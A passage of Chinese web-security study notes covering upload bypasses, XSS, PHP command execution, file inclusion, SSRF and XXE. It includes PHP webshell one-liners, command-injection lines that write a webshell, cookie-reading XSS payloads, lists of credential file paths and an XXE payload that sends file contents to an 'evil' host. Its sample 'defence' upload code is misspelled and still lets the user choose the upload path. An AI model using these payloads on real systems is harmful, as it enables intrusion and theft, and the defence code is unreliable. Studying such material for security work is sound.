href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h4><ol><li>IIS v6.0</li></ol><p>建立<code>xxx.asp</code>或<code>xxx.asa</code>文件夹时，其下面的内容全部会被当作asp文件进行解析，和文件后缀无关</p><p>WebDav扩展了HTTP协议，支持<code>PUT、Move、Copy、Delete</code>等方法：先用<code>OPTION</code>方法探测服务器支持的HTTP方法—》<code>PUT</code>方法向服务器上传脚本—》借助<code>Move</code>或<code>Copy</code>方法来进行改名；检测工具：IIS Write</p><ol><li>Apache 1.x 2.x</li></ol><p>碰到不认识的扩展名时从右向左进行解析<code>1.php.rar.jsp.jpg.sasasas</code></p><p>扩展名识别目录在<code>/conf/mime.types</code>下</p><ol><li>PHP CGI</li></ol><p>由于PHP配置文件中<code>cgi_xpathinfo</code>默认开启，导致<code>xxx.com/x.txt/x.php</code>中并没有找到<code>x.php</code>文件，则会向前按照php文件来解析<code>x.txt</code>；</p><h4 id="文件上传限制绕过漏洞"><a href="#文件上传限制绕过漏洞" class="headerlink" title="文件上传限制绕过漏洞"></a>文件上传限制绕过漏洞</h4><ol><li><p>客户端检测绕过：本地禁用JS即可，Firebug插件安装可以将事件删除；或者在BurpSuite中抓包修改，注意<code>contect-length</code>的修改</p></li><li><p>服务端检测：</p><ul><li>黑名单：<code>asp,php,jsp,php5,asa,aspx</code>；<ol><li>找到忽略的扩展名<code>cer</code>；</li><li>是否可以大小写转换（asp，php可用）</li><li>在win下会自动忽略<code>asp.</code>后面的.或空格</li><li>将后缀名用空格替换时<code>asaspp</code>；</li><li>win下NTFS特有<code>xx.asp::$DATA</code>绕过</li></ol></li><li>白名单：防御机制相对更好<ol><li>IIS 6.0会将<code>xxx.asp;1.jpg</code>当作asp脚本执行，但上传时仍是jpg</li><li>截断上传攻击：利用<code>%00</code>后面的字符会截断的特性，上传文件命名为<code>xx.asp%00target.jpg</code>；抓包的话<code>xx.asp0x00jpg</code></li></ol></li><li>MIME验证：bp进行中间人攻击，更改<code>content-type</code>；</li></ul></li></ol><div class="table-container"><table><thead><tr><th>MIME（大小写不敏感）</th><th>说明</th></tr></thead><tbody><tr><td>image/(jpeg、gif)</td><td>jpg、jpeg、gif图形</td></tr><tr><td>application/(x-tar、x-gzip、rtf)</td><td>tar、gzip、rtf文本</td></tr><tr><td>text/html</td><td>html</td></tr></tbody></table></div><ul><li>目录验证：即某种条件下允许新建立目录，则建立利用<code>.asp</code>结尾的目录，从而利用web容器的解析漏洞</li><li>文件内容检测：一般都是对文件头进行检测，需要伪造好，或者使用隐写术的拼接</li><li>长度截断：文件名超系统最大范围时，会截断超出部分</li><li>竞争上传：服务端先保存再检验，则写一个生成木马的图片木马</li></ul><h4 id="文本编辑器上传漏洞"><a href="#文本编辑器上传漏洞" class="headerlink" title="文本编辑器上传漏洞"></a>文本编辑器上传漏洞</h4><p>这里的文本编辑器通常指富文本Web编辑器（ex：CKEditor、Ewebeditor、UEeditor、KindEditor、XHeditor）</p><p>通常中有以下措施：</p><ol><li>查看敏感文件目录，如版本、默认上传页面等</li><li>黑名单策略绕过</li><li>任意文件上传，类型绕过</li></ol><h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$arr</span>=<span class="title function_ invoke__">Array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;rar&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;doc&#x27;</span>,<span class="string">&#x27;docx&#x27;</span>);<span class="comment">//白名单</span></span><br><span class="line"><span class="variable">$imageTempName</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];<span class="comment">//临时路径接收文件</span></span><br><span class="line"><span class="variable">$imageName</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];<span class="comment">//接收文件名称</span></span><br><span class="line"><span class="variable">$last</span>=<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$imageName</span>,<span class="title function_ invoke__">strtpos</span>(<span class="variable">$imageName</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>));<span class="comment">//扩展名转换为小写</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_arrar</span>(<span class="variable">$last</span>,<span class="variable">$arr</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;不支持该扩展. <span class="subst">$last</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Extension</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;Extension&#x27;</span>]<span class="comment">//获取文件上传路径</span></span><br><span class="line"><span class="variable">$imageName</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$imageName</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$last</span>;<span class="comment">//文件重命名</span></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$imageTempName</span>,<span class="string">&quot;./<span class="subst">$Extension</span>/&quot;</span>.<span class="variable">$imageName</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;上传成功 path=/<span class="subst">$Extension</span>/<span class="subst">$imageName</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>设置临时路径，或者将上传路径设置为不可执行</p></li><li><p>扩展名大小写变更后与白名单对比</p></li><li>重命名文件名/路径</li></ol><hr><h3 id="XSS跨站脚本漏洞"><a href="#XSS跨站脚本漏洞" class="headerlink" title="XSS跨站脚本漏洞"></a>XSS跨站脚本漏洞</h3><p>用户恶意向网页中插入脚本执行，大多为JS、VBS等；<code>&lt;script&gt;alert(&#39;hello&#39;)&lt;/script&gt;</code>；工具：xsser（kali）、beef-xss(kali)、xss-proxy、XSS shell；靶场：BuleLotus XSSReceiver、xss.pt、xss platfrom、XSSER.ME</p><h4 id="xss类型"><a href="#xss类型" class="headerlink" title="xss类型"></a>xss类型</h4><ol><li>反射型/非持久性XSS</li></ol><p>黑客URL—&gt;用户检索信息—&gt;服务器无过滤，不保存，将恶意代码拼接在HTML中返回—&gt;用户端浏览器执行脚本；</p><p>发送的URL中含有恶意代码（给别人），可以通过短链接生成进行伪装；多用于钓鱼</p><ol><li>存储型/持久性XSS</li></ol><p>允许用户存储数据就有可（评论等）能；恶意代码评论存入无过滤的服务器，用户在正常请求时，被迫自动执行恶意代码；范围广</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;<span class="regexp">/script&gt;/</span>/普通注入</span><br><span class="line"><span class="string">&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;//闭合标签注入</span></span><br><span class="line"><span class="string">&lt;textarea&gt;&#x27;&quot;</span>&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="comment">//闭合标签注入</span></span><br></pre></td></tr></table></figure><ol><li>DOM型XSS</li></ol><blockquote><p>DOM即文件对象模型，代表HTML、XML等中的对象；DOM就是为帮助浏览器渲染工作的大纲</p></blockquote><p>涉及DOM的重构，与反射性类似，但服务器返回的HTML文档并不包含恶意脚本，且可以不经过网络，是在本地浏览器进行渲染时发生注入的；<code>#</code>使用html中的锚点不经过后端</p><h4 id="XSS高级利用"><a href="#XSS高级利用" class="headerlink" title="XSS高级利用"></a>XSS高级利用</h4><p>GetShell、会话劫持（窃取cookie）、XSS蠕虫（一般基于JavaScript编写，针对浏览器）等，可以通过前面所提到的框架工具食用</p><h4 id="防御-绕过措施"><a href="#防御-绕过措施" class="headerlink" title="防御/绕过措施"></a>防御/绕过措施</h4><p>防御：</p><ol><li><p><code>&lt;、&gt;、&quot;、&#39;、&amp;</code>进行转义</p><p>Java中的第三方组件：OWASP Esapi、JSOUP、xssprotect</p><p>PHP中<code>htmlentities()、htmlspecialchars()</code>；</p><p>ASP.NET中<code>Server.HtmlEncode()、Microsoft Anti-Cross Site Scripting Library</code></p><p>Python中<code>cgi.escape()</code></p><p>ASP中<code>Server.HTMLEncode()</code></p><p>Node.js中<code>node-validator</code></p></li><li><p>HttpOnly：简单来说，页面上只要Http和css；</p></li><li><p>后端黑白名单设置</p></li></ol><p>绕过：</p><ol><li><p><code>&lt;&gt;</code>被过滤时使用事件<code>onfoucus</code>等；</p></li><li><p>alert被过滤时可以进行编码，此外<code>prompt、confirm</code>也可以进行弹窗；</p></li><li>on事件被过滤，某些属性可以执行js，<code>formation|action|href|xlink:href|autofocus|src|content|data</code>;</li><li>标签和属性之间可以不用空格，例<code>&lt;img/src=x oneerror=alert(1)&gt;</code>；</li><li><p>标签也可以不合法<code>&lt;M/onclick=&quot;alert(1)&quot;&gt;M</code>；</p></li><li><p>双写scscriptipt、大小写<code>&lt;ScripT&gt;</code>、<code>&lt;ifrme&gt;</code>标签</p></li></ol><hr><h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>用户输入的参数被当作命令执行，主要为PHP代码执行漏洞；区别一下代码执行漏洞和命令执行漏洞，后者直接调用OS命令，前者是依靠脚本来间接执行OS命令。php-webshell连接工具：b374k web shell</p><blockquote><p>java SE中Runtime类，ProcessBuilder等也含有</p></blockquote><h4 id="PHP命令执行"><a href="#PHP命令执行" class="headerlink" title="PHP命令执行"></a>PHP命令执行</h4><p>php中命令执行函数<code>eval() assert() preg_replace() create_function()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span><span class="comment">//输入参数时要加分号</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span><span class="comment">//可以不加分号</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="string">&quot;just test&quot;</span>);<span class="meta">?&gt;</span><span class="comment">//将中间的命令，替换后面的字符串，之后执行</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]; <span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>; <span class="variable">$new_array</span>=<span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new_arrray</span>; <span class="meta">?&gt;</span><span class="comment">//将array中的各项作为参数代入到func函数中进行执行</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]; <span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>(<span class="variable">$b</span>); <span class="meta">?&gt;</span><span class="comment">//a=assert&amp;b=phpinfo()，即assert(phpinfo())</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=`ls -a`; <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$a</span>&lt;/pre&gt;&quot;</span>; <span class="meta">?&gt;</span><span class="comment">//反引号-执行操作符，可以执行命令</span></span><br></pre></td></tr></table></figure><p>其他函数<code>system() exec() shell_exec() passthru() penti_exec() popea() proc_pen() ob_start()</code>;</p><p>getshell：写php🐎</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|<span class="built_in">echo</span><span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span> &gt;1.php</span><br><span class="line">127.0.0.1|<span class="built_in">echo</span><span class="string">&quot;&lt;?php (<span class="variable">$_</span>=@<span class="variable">$_GET</span>[2]).@<span class="variable">$_</span>(<span class="variable">$_POST</span>[1])?&gt;&quot;</span> &gt;1.php</span><br><span class="line">fputs(fopen(<span class="string">&quot;horse.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;])?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>绕过/混淆方式：</p><ol><li>利用ascii进行代码混淆，cmd=<code>eval(chr(102).chr(112).~~~)</code></li><li>base64<code>fputs(fopen(base64_decode(~~~),w),base64_decode(~~~));</code>，注意对符号的避免，可以使用二次编码来去除base64特征符号</li></ol><h4 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h4><ol><li>禁用前面所述的高危函数（php.ini—disable_functions后面进行添加）；或者php.ini中的safe_mode进行开启，会将上述部分函数禁用，反引号也将被禁用</li><li>过滤特殊字符，制作白名单</li></ol><hr><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>A文件包含了含有恶意代码的B文件，导致载荷执行。多出现于PHP中，与上传漏洞配合。CVE-2018-12613 PHPmyadmin上传文件漏洞；</p><h4 id="PHP包含"><a href="#PHP包含" class="headerlink" title="PHP包含"></a>PHP包含</h4><p>包括本地包含LFI和远程包含RFI，相关函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>()<span class="comment">//找不到被包含的函数会产生错误，并停止脚本</span></span><br><span class="line"><span class="keyword">include</span>()<span class="comment">//找不到只产生警告</span></span><br><span class="line"><span class="keyword">include_once</span>()<span class="comment">//已被包含的话则不会再次包含</span></span><br><span class="line"><span class="keyword">require_once</span>()<span class="comment">//同上</span></span><br></pre></td></tr></table></figure><p>本地包含时，只要目标文件符合php语法，解析器就会按照php代码进行执行，不用在意后缀，而对非php代码进行包含则会显示内容；远程包含需要在<code>php.ini</code>中将<code>allow_url_include = On</code>打开，执行效果同上</p><p>利用：</p><ol><li>读取敏感文件</li></ol><div class="table-container"><table><thead><tr><th>win路径</th><th>说明</th></tr></thead><tbody><tr><td>C:\boot.ini</td><td>系统版本</td></tr><tr><td>C:\windows\system32\inetsrv\MetaBase.ini</td><td>IIS配置文件</td></tr><tr><td>C:\windows\repair\sam</td><td>win密码</td></tr><tr><td>C:\Program Files\mysql\my.ini</td><td>Mysql配置</td></tr><tr><td>C:\Program Files\mysql\data\mysql\user.MYD</td><td>mysql的root</td></tr><tr><td>C:\windows\php.ini</td><td>php配置</td></tr><tr><td>C:\windows\my.ini</td><td>mysql配置</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>Linux路径</th><th>说明</th></tr></thead><tbody><tr><td>/etc/passwd</td><td>系统密码</td></tr><tr><td>/usr/local/app/apache2/conf/httpd.conf</td><td>apache默认配置文件</td></tr><tr><td>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf</td><td>虚拟网络设置</td></tr><tr><td>/usr/local/app/php5/lib/php.ini</td><td>php配置</td></tr><tr><td>/etc/httpd/conf/httpd.conf</td><td>apache配置</td></tr><tr><td>/etc/my.cnf</td><td>mysql配置</td></tr></tbody></table></div><ol><li><p>利用远程包含进行木马包含</p></li><li><p>使用php封装协议，URL风格的系统函数<em>point</em></p></li></ol><div class="table-container"><table><thead><tr><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>file://</td><td>访问本地文件</td></tr><tr><td><a href="http://、ftp://">http://、ftp://</a></td><td>访问网站、ftp的URL等</td></tr><tr><td>glob://</td><td>查找匹配的文件路径</td></tr><tr><td>php://input、php://filter</td><td>接受post参数、执行php代码（需要远程包含开启）、读取非php代码</td></tr><tr><td>zip://、bzip://、zlib://、phar://</td><td>访问压缩文件中的子文件</td></tr><tr><td>data://</td><td>将文件流重定向为用户输入流</td></tr></tbody></table></div><ol><li><p>apache文件包含：apache包括访问日志access.log和错误日志error.log，当访问一段有一句话木马的URL时<code>hhh.com/&lt;?php phpinfo();?&gt;</code>时，则会在日志中进行写入，之后再包含这个日志即可</p><blockquote><p>注意该URL会被浏览器转码，需要借助BP来进行编码的绕过</p></blockquote></li><li><p>绕过：%00截断<code>magic_quotes_gps=off</code>php版本&lt;5.3.4</p><p>路径长度截断：win下最大256字节，linux下4096字节，php&lt;5.2.8</p></li></ol><h4 id="JSP包含"><a href="#JSP包含" class="headerlink" title="JSP包含"></a>JSP包含</h4><p>静态包含：先复制再处理；动态包含相反</p><p><code>&lt;%@ include file=&quot;page.txt&quot;%&gt;</code>为静态包含语句，page.txt其中的jsp代码会被解析，但是由于无法更改后端的代码包含文件，因此攻击者无法控制被包含文件，基本不存在漏洞</p><p>动态包含可以包含一个变量，但是仅能显示其中的代码，并不会进行解析</p><h4 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h4><ol><li>判断参数是否安全</li><li>将可以包含的路径限制再自己的文件夹内</li><li>设置文件白名单验证</li><li>减少使用动态包含</li></ol><hr><h3 id="CSRF-amp-amp-SSRF"><a href="#CSRF-amp-amp-SSRF" class="headerlink" title="CSRF&amp;&amp;SSRF"></a>CSRF&amp;&amp;SSRF</h3><h4 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h4><p>建立在一段<em>会话之上</em>，通过目标已登录的状态<em>点击攻击者布置的URL</em>，来达到目的，分为GET型和POST型；检测工具：CSRFTester、bp中Scanner模块有<code>Generate CSRF Poc</code>；靶场PocBox</p><p>通常用于增删改等操作，其它用于读取操作类型的JSONP、CORS、Flash跨域劫持</p><p>跨站资源共享：cors使用额外的HTTP头<code>Origin:xxxxxx://ip</code>来使A能够使用B的资源；另一种策略是JSONP，前端构造一个恶意页面，请求JSONP接口，收集服务端的敏感信息</p><p>预防：二次确认+Token认证，双重cookie，同源检测</p><blockquote><p>Token相当于验证码，服务端随机生成一段字符串，并存储在session中，在敏感操作中加入隐藏标签（如果是GET请求则考虑在cookie中），客户端提交请求后与session中的token对比验证，更新token</p></blockquote><h4 id="SSRF服务端请求构造"><a href="#SSRF服务端请求构造" class="headerlink" title="SSRF服务端请求构造"></a>SSRF服务端请求构造</h4><p>由于服务端对用户输入URL信任，导致目标服务器可以从其他服务器加载获取内容，即利用服务器来进行攻击者的请求也就是跳板；多用于内网信息搜集；靶场：SSRF-lab</p><p>php中常用函数</p><p><code>file_get_contents() fsockopen() fopen() readfile() curl_exec()</code>；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);<span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//从指定url获取内容，并作为文件保存，并展示</span></span><br></pre></td></tr></table></figure><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$errno</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);<span class="comment">//目标主机，端口，错误xx，错误信息字符串，时限</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);<span class="comment">//执行指定curl会话，多与dict、file、gopher协议搭配使用</span></span><br></pre></td></tr></table></figure><p>可能出现漏洞url关键字：<code>share、wap、url、link、src、source、target、display、socureURL、imageURL、domain</code>；</p><p>可能出现的功能：网页分享、转码服务、在线网页翻译、图片加载与下载、文章收藏</p><p>绕过：</p><ol><li>使用—域名@IP/域名：端口</li><li>短地址，非http协议</li><li>IP地址转换十进制整数，IP—Hex—十进制</li></ol><p>修复：限制内网访问并屏蔽返回消息；</p><hr><h3 id="Xml外部实体注入"><a href="#Xml外部实体注入" class="headerlink" title="Xml外部实体注入"></a>Xml外部实体注入</h3><h4 id="XML介绍"><a href="#XML介绍" class="headerlink" title="XML介绍"></a>XML介绍</h4><p>xml与html的标签非常相似，但是目的只是传输数据，而非显示，因此标签名字都可以由用户定义</p><p>DTD文档定义类型，用于对XML文件的格式描述；可以在内部也可以在外部</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;根元素</span><br><span class="line">&lt;to&gt;Y0u&lt;/to&gt;元素-值</span><br><span class="line">&lt;from&gt;@re&lt;/from&gt;</span><br><span class="line">&lt;head&gt;v3ry&lt;/head&gt;</span><br><span class="line">&lt;body&gt;g00d!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>外部DTD引用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;</span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>PCDATA：会被解析器解析的文本。其中的标签会被当作标记来处理，实体则会被展开。其中不应该包含<code>&amp; &lt; &gt;</code>需要用<code>&amp;amp &amp;lt &amp;gt</code>代替；</p><p>CDATA：字符数据，不会被解析器解析，其中的标签不会被当作标记，实体也不会被展开</p><div class="table-container"><table><thead><tr><th>声明一个元素</th><th>&lt;!ENTITY 元素名称 类别&gt;</th><th>&lt;!ELEMENT 元素名称(元素内容)&gt;</th></tr></thead><tbody><tr><td>空元素</td><td>&lt;!ENTITY 元素名称 EMPTY&gt;</td><td>&lt;!ELEMENT <br>EMPTY</br>&gt;</td></tr><tr><td>只有PCDTATA的元素</td><td>&lt;!ENTITY 元素名称(#PCDATA)&gt;</td><td>&lt;!ELEMENT from (#PCDATA)&gt;</td></tr><tr><td>带有任何内容的元素</td><td>&lt;!ENTITY 元素名称 ANY&gt;</td><td>&lt;!ELEMENT note ANY&gt;</td></tr><tr><td>带有子元素(序列)的元素</td><td>&lt;!ENTITY 元素名称(子1,子2..)&gt;</td><td>&lt;!ELEMENT note(to,from,heading,body)&gt;</td></tr></tbody></table></div><p>实体=变量，需要在DTD中声明，之后在其他位置就可以引用&amp;该变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;//内部实体</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;//外部实体</span><br><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或&lt;!ENTIETY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br><span class="line">//参数实体</span><br></pre></td></tr></table></figure><h4 id="XXE原理"><a href="#XXE原理" class="headerlink" title="XXE原理"></a>XXE原理</h4><p>在应用程序解析XML输入时，没有禁止外部实体的加载，导致可以加载外部文件和代码。常出现于可以上传xml文件的位置</p><p>特征：url是.ashx后缀；响应体是xml</p><p>在php中<code>file_get_content(path-必选,,句柄环境,文件开始读取位置,读取字节数)</code>函数把整个文件读入到一个字符串中；如下是外部实体可以支持的协议，</p><div class="table-container"><table><thead><tr><th>libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file、http、ftp</td><td>同左</td><td>同左</td><td>同左</td></tr><tr><td></td><td>php、data、glob、phar</td><td>https、jar、netdoc</td><td>https</td></tr></tbody></table></div><ul><li><p>有回显时，直接通过DTD外部实体声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;abc&gt;&amp;test;&lt;/abc&gt;</span><br></pre></td></tr></table></figure></li><li><p>有回显时，借助DTD再次引入外部DTD</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;</span><br><span class="line">&lt;abc&gt;&amp;b;&lt;/abc&gt;</span><br><span class="line"></span><br><span class="line">evil.dtd如下</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>无回显时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;abc&gt;&lt;/abc&gt;</span><br><span class="line"></span><br><span class="line">evil.dtd如下</span><br><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#x27;http://localhost/?content=%file;&#x27;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure></li></ul><p>防御：使用开发语言提供的禁用外部实体的方法、过滤用户提交的XML数据</p><hr><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>对象转换为字符串叫序列化，反之就是反序列化，用于对象传输问题；漏洞产生原因是反序列化时会调用到相关析构函数（魔术函数），而该函数内参数可控，攻击者控制输入参数执行一些敏感操作；常见的序列化格式：二进制格式，字节数组，json字符串，xml字符串</p><h4 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" 